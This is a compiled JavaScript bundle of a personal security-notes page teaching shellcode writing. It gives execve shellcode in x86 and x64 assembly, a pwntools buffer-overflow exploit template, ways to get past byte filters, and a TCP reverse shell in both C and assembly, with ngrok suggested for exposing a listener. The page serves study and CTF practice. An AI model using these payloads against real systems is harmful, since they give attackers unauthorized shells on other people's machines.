"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[6801],{68916:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>l,toc:()=>c});var r=s(74848),t=s(28453);const i={},a="\ud83e\uded7 Shellcode",l={id:"security/binary/shellcode",title:"\ud83e\uded7 Shellcode",description:"A shellcode is a malicious sequence of assembly instruction.",source:"@site/docs/security/04-binary/05-shellcode.md",sourceDirName:"security/04-binary",slug:"/security/binary/shellcode",permalink:"/docs/security/binary/shellcode",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/04-binary/05-shellcode.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udd01 Reverse",permalink:"/docs/security/binary/reverse"},next:{title:"\u270b Mitigations",permalink:"/docs/security/binary/mitigations"}},d={},c=[{value:"execve",id:"execve",level:3},{value:"x86",id:"x86",level:3},{value:"x64",id:"x64",level:3},{value:"Python template",id:"python-template",level:2},{value:"Alternative ways to write a shellcode",id:"alternative-ways-to-write-a-shellcode",level:2},{value:"Write the path parameter on stack",id:"write-the-path-parameter-on-stack",level:3},{value:"Use a call to get the address of the path parameter",id:"use-a-call-to-get-the-address-of-the-path-parameter",level:3},{value:"Special cases",id:"special-cases",level:2},{value:"Specific characters are not allowed",id:"specific-characters-are-not-allowed",level:3},{value:"Not enough input",id:"not-enough-input",level:3},{value:"Copy RIP content inside another registry",id:"copy-rip-content-inside-another-registry",level:3},{value:"Few bytes operations",id:"few-bytes-operations",level:3},{value:"Reverse shell over TCP socket",id:"reverse-shell-over-tcp-socket",level:2},{value:"socket",id:"socket",level:3},{value:"connect",id:"connect",level:3},{value:"dup2",id:"dup2",level:3}];function o(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"-shellcode",children:"\ud83e\uded7 Shellcode"}),"\n",(0,r.jsx)(n.p,{children:"A shellcode is a malicious sequence of assembly instruction.\nUsually, it is inserted in memory and then executed by exploiting a vulnerability.\nIt is called shellcode because at the beginning it was used only to obtain a shell.\nNowadays, shellcodes are used to execute whatever sequence of instructions."}),"\n",(0,r.jsx)(n.p,{children:"You must have a vulnerability that allows to overwrite the saved instruction pointer of a function.\nAlso, the memory area where you write the shellcode must be executable."}),"\n",(0,r.jsx)(n.h3,{id:"execve",children:"execve"}),"\n",(0,r.jsxs)(n.p,{children:["A shellcode is usually used to obtain a reverse shell by running the ",(0,r.jsx)(n.code,{children:"execve"})," syscall with the right parameters."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"int execve(const char *pathname, char *const argv[], char *const envp[]);"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"pathname"})," The path for the executable to be run, usually a pointer to the string ",(0,r.jsx)(n.code,{children:"/bin/sh\\0"})]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"argv"})," A pointer to an array of command line parameters, it can be null"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"envp"})," A pointer to an array of environmental variables, it can be null"]}),"\n",(0,r.jsx)("p",{align:"center",children:(0,r.jsx)("img",{src:s(11823).A})}),"\n",(0,r.jsx)(n.h3,{id:"x86",children:"x86"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Register"}),(0,r.jsx)(n.th,{children:"Content"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"eax"}),(0,r.jsx)(n.td,{children:"syscall code"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"ebx"}),(0,r.jsx)(n.td,{children:"path"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"ecx"}),(0,r.jsx)(n.td,{children:"argv"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"edx"}),(0,r.jsx)(n.td,{children:"envp"})]})]})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:'mov eax, 0xb                            ; execve code in x86\nmov ebx, <address of "/bin/sh\\0">\nmov ecx, 0\nmov edx, 0\nint 0x80\n'})}),"\n",(0,r.jsx)(n.h3,{id:"x64",children:"x64"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Register"}),(0,r.jsx)(n.th,{children:"Content"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"rax"}),(0,r.jsx)(n.td,{children:"syscall code"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"rdi"}),(0,r.jsx)(n.td,{children:"path"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"rsi"}),(0,r.jsx)(n.td,{children:"argv"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"rdx"}),(0,r.jsx)(n.td,{children:"envp"})]})]})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:'mov rax, 0x3b                           ; execve code in x64\nmov rdi, <address of "/bin/sh\\0">\nmov rsi, 0\nmov rdx, 0\nsyscall\n'})}),"\n",(0,r.jsx)(n.h2,{id:"python-template",children:"Python template"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/env python3\n\nimport sys\nfrom pwn import *\n\nif "--remote" in sys.argv:\n    p = remote("url", 1337)\nelse:\n    p = process("./path_to_binary")\n\nif "--debug" in sys.argv:\n    context.terminal = ["gnome-terminal"]\n    gdb.attach(p, """\n    b *<address_breakpoint>\n    c\n    """)\n\nshellcode = asm("""\nmov rax, 0x3b\nmov rdi, <buffer_address>\nmov rsi, 0\nmov rdx, 0\nsyscall\n""", arch=\'amd64\')\n\npayload = "A" * 64\npayload += shellcode\np.sendline(payload)\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h2,{id:"alternative-ways-to-write-a-shellcode",children:"Alternative ways to write a shellcode"}),"\n",(0,r.jsx)(n.h3,{id:"write-the-path-parameter-on-stack",children:"Write the path parameter on stack"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:'mov rdi, 0x68732f6e69622f         ; write the string "/bin/sh\\0" in a register\npush rdi                          ; push it on stack\nmov rdi, rsp                      ; get its address\n\nmov rax, 0x3b\nmov rsi, 0\nmov rdx, 0\nsyscall\n'})}),"\n",(0,r.jsx)(n.h3,{id:"use-a-call-to-get-the-address-of-the-path-parameter",children:"Use a call to get the address of the path parameter"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:'jmp address\n\ncode:\n    mov rax, 0x3b\n    pop rdi\n    mov rsi, 0\n    mov rdx, 0\n    syscall\n\naddress:\n    call code           ; the next address is saved on stack\n\n    ; put here "/bin/sh\\0" during the read of the shellcode\n'})}),"\n",(0,r.jsx)(n.h2,{id:"special-cases",children:"Special cases"}),"\n",(0,r.jsx)(n.h3,{id:"specific-characters-are-not-allowed",children:"Specific characters are not allowed"}),"\n",(0,r.jsx)(n.p,{children:'To put "\\0" at the end of "/bin/sh" is possible to use these instructions.'}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:'mov ebx, 0x804c040      ; ebx is the address of the string "/bin/sh"\nmov al, 0               ; al is zero\nmov [ebx + 7], al       ; move zero in the byte pointed by ebx + 7\n'})}),"\n",(0,r.jsx)(n.p,{children:"The idea is to put the value in a registry and then move it inside a specific address.\nIt can be used to change everything in memory."}),"\n",(0,r.jsx)(n.p,{children:'For example, we could find a binary that blocks any syscalls by filtering the bytes "0f 05" (syscall assembly code).\nTo overcome it you could write the initial shellcode padded with a nop sled.\nThen, you could write the two characters needed in any point of the memory.'}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"; rax contains the address of the buffer where the shellcode is written\n; 0f 05 is the assembly code for the syscall instruction\n\nmov bl, 0x0e\ninc bl\nmov [rax + 107], bl\n\nmov bl, 0x04\ninc bl\nmov [rax + 108], bl\n"})}),"\n",(0,r.jsx)(n.h3,{id:"not-enough-input",children:"Not enough input"}),"\n",(0,r.jsx)(n.p,{children:"If there is not enough input for a shellcode you could try to call a read or other syscalls."}),"\n",(0,r.jsx)(n.p,{children:"For example, this shellcode for x86 is long 22 chars once assembled, but it allows to read additional 256 chars."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"mov eax, 2                      ; read syscall code\nmov ebx, 0\nmov ecx, <buffer_address>\nmov edx, 0x100                  ; number of characters to read\nint 0x80\n"})}),"\n",(0,r.jsx)(n.h3,{id:"copy-rip-content-inside-another-registry",children:"Copy RIP content inside another registry"}),"\n",(0,r.jsx)(n.p,{children:"It is not possible to directly move the RIP content inside another registry.\nWe can bypass it by using the call instruction."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"call here       ; address of next istruction (sRIP) is saved on top of the stack\n\ncode:\n    ; additional code here...\n\nhere:\n    pop rsi     ; rsi will contain the RIP address, you can change it with other registers\n    jmp code\n"})}),"\n",(0,r.jsx)(n.h3,{id:"few-bytes-operations",children:"Few bytes operations"}),"\n",(0,r.jsxs)(n.admonition,{type:"caution",children:[(0,r.jsx)(n.p,{children:"Be careful, working with x32 registers in x64 leads to lose the high part of them."}),(0,r.jsxs)(n.p,{children:["For example, the instruction ",(0,r.jsx)(n.code,{children:"inc esp"})," removes the high bytes of rsp."]})]}),"\n",(0,r.jsx)(n.p,{children:"One byte"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"push rax\npop rax\n\ninc eax\ndec eax\n\nmov al, 0xff\nadd al, 0xff\nsub al, 0xff\n\nxor al, al\nor al, al\nand al, al\n\ninc al\ndec al\nshl al\nshr al\n"})}),"\n",(0,r.jsx)(n.p,{children:"Two bytes"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"syscall\n\nmov eax, esp\n\nxor eax, eax\nor eax, eax\nand eax, eax\n\nshl eax\nshr eax\n"})}),"\n",(0,r.jsx)(n.h2,{id:"reverse-shell-over-tcp-socket",children:"Reverse shell over TCP socket"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Create a new socket"}),"\n",(0,r.jsx)(n.li,{children:"Copy the file descriptor of the new socket"}),"\n",(0,r.jsx)(n.li,{children:"Connect to your server"}),"\n",(0,r.jsx)(n.li,{children:"Duplicate the file descriptors for input, output and error with the new one."}),"\n",(0,r.jsx)(n.li,{children:"Exec a shell"}),"\n",(0,r.jsx)(n.li,{children:"Exploit"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"This is a sample of the C code that does the same thing.\nIt can be used for testing or as guide using gdb."}),"\n",(0,r.jsxs)(n.p,{children:["You can use a tool like ",(0,r.jsx)(n.a,{href:"https://ngrok.com/",children:"ngrok"})," to make a public tcp tunnel to your localhost."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",metastring:'title="socket.c"',children:'#include <arpa/inet.h>\n#include <stdio.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\nint main()\n{\n    struct sockaddr_in serv_addr;\n    int sock = 0;\n    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(1337);\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)\n    {\n        puts("Cannot connect!");\n        return 1;\n    }\n    puts("Connected");\n\n    dup2(sock, 0);\n    dup2(sock, 1);\n    dup2(sock, 2);\n\n    execve("/bin/sh\\0", NULL, NULL);\n    return 0;\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"socket",children:"socket"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"int socket (int domain, int type, int protocol)"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"domain: 2 for IPv4 socket"}),"\n",(0,r.jsx)(n.li,{children:"type: 1 for standard socket"}),"\n",(0,r.jsx)(n.li,{children:"protocol: 0 for TCP"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"The file descriptor of the created socket is returned in the rax register."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"mov rax, 0x29\nmov rdi, 2\nmov rsi, 1\nmov rdx, 0\nsyscall\n\nmov rbx, rax    ; returned value is saved inside rbx, this is important for the next examples\n"})}),"\n",(0,r.jsx)(n.h3,{id:"connect",children:"connect"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"int connect(int socket, const struct sockaddr *address, socklen_t address_len);"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"struct in_addr {\n    unsigned long s_addr;       /* Internet address (32 bits) */\n}\n\nstruct sockaddr_in {\n    unsigned short sin_family;  /* Internet protocol (AF_INET) */\n    unsigned short sin_port;    /* Address port (16 bits) */\n    struct in_addr sin_addr;    /* Internet address (32 bits) */\n    char sin_zero[8];           /* Not used */\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["The struct is composed by ",(0,r.jsx)(n.code,{children:"ip + hton(port) + 2 (IF_NET type of socket)"})," with a size of 8 bytes (4 + 2 + 2)."]}),"\n",(0,r.jsx)(n.p,{children:"For example, considering the ip 127.0.0.1, the port 1337 and type 2:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"0x0100007f39050002 ->   0100007f    3905    0002\n                        127.0.0.1   1337      2\n"})}),"\n",(0,r.jsx)(n.p,{children:"Remember little endian for each value.\nIP address is saved byte per byte."}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"socket:"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"mov rsi, 0x0100007f39050002\npush rsi\nmov rsi, rsp\n\nmov rax, 0x2a\nmov rdi, rbx        ; rbx contains the socket descriptor\nmov rdx, 0x10\nsyscall\n"})}),"\n",(0,r.jsx)(n.h3,{id:"dup2",children:"dup2"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"dup2(int oldfd, int newfd);"})}),"\n",(0,r.jsx)(n.p,{children:"Substitute standard input, output and error with the socket descriptor (rbx)."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-as",children:"mov rax, 0x21\nmov rdi, rbx\nmov rsi, 0\nsyscall\n\nmov rax, 0x21\nmov rdi, rbx\nmov rsi, 1\nsyscall\n\nmov rax, 0x21\nmov rdi, rbx\nmov rsi, 2\nsyscall\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},11823:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/execve-019e48be19bf3ad017f4e8bacef59db0.jpg"},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>l});var r=s(96540);const t={},i=r.createContext(t);function a(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);